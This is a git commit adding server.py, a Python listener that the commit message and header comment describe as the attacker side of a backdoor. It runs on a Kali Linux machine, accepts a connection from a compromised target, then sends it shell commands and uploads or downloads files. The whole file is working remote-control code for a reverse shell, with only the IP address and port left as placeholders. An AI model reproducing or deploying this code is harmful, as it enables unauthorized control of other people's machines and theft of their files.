6ba7a37594025b7ceb67cad190318f358dcce7f2
Andres Romero <romeroandre801@outlook.com>
2023-05-29 21:27:05 -0600

    Create server.py
    Sets up a server to listen for a connection on the target machine. Once a connection is established, allowed the kali linux machine to execute commands, upload and download files, etc.

---
+++ server.py
@@ -0,0 +1,66 @@
+#This is a server to be run on the kali linux machine to listen for a backdoor connection on the target machine.
+
+import socket
+import json
+import os
+
+
+def reliable_send(data):
+	jsondata = json.dumps(data)
+	target.send(jsondata.encode())
+
+def reliable_recv():
+	data = ''
+	while True:
+		try:
+			data = data + target.recv(1024).decode().rstrip()
+			return json.loads(data)
+		except ValueError:
+			continue
+
+def upload_file(file_name):
+        f = open(file_name, 'rb')
+        target.send(f.read())
+
+
+def download_file(file_name):
+	f = open(file_name, 'wb')
+	target.settimeout(1)
+	chunk = target.recv(1024)
+	while chunk:
+		f.write(chunk)
+		try:
+			chunk = target.recv(1024)
+		except socket.timeout as e:
+			break
+	target.settimeout(None)
+	f.close()
+
+
+def target_communication():
+	while True:
+		command = input('* Shell~%s: ' % str(ip))
+		reliable_send(command)
+		if command == 'quit':
+			break
+		elif command == 'clear':
+			os.system('clear')
+		elif command[:3] == 'cd ':
+			pass
+		elif command[:8] == 'download':
+			download_file(command[9:])
+		elif command[:6] == 'upload':
+			upload_file(command[7:])
+		else:
+			result = reliable_recv()
+			print(result)
+
+
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('192.168.x.xxx', 55xx)) #update the ipaddress to be kali linux ip and the port number to be a port num of choice.
+print('[+] Listening For The Incoming Connections')
+sock.listen(5)
+target, ip = sock.accept()
+print('[+] Target Connected From: ' + str(ip))
+target_communication()
